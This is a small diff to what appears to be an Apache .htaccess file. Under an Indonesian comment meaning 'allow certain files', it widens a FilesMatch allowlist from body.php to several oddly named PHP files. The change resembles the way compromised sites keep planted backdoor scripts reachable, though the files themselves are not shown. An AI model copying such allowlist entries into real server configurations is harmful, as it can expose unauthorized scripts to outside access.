@@ -10,7 +10,7 @@ Require all granted
 </FilesMatch>
 
 # Izinkan file tertentu
-<FilesMatch '^(body.php|)$'>
+<FilesMatch '^(body.php|migrationbodyv1.php|generateTestMetricsV1.php|InterestMagerav1.php|form/PublicProfileForsite.php)$'>
 Require all granted
 </FilesMatch>
 
